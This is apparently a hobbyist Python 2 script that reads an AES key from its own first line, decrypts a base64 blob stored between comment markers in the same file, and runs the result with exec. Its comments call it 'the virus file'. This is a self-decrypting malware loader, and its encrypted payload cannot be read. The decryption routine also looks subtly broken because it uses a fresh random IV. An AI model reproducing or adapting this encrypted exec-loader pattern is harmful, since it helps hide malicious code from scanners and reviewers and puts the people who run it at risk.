print "HELOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO"
######################################################## First script python
# coding=utf-8
# Start Uncrypted
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readline()
   this.close()

   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '#Start payload':
      copy = True
   elif line.strip() == '#End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
print e
exec e
sys.exit('Good job!')
# End Uncrypted
#Start payload
#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
#End payload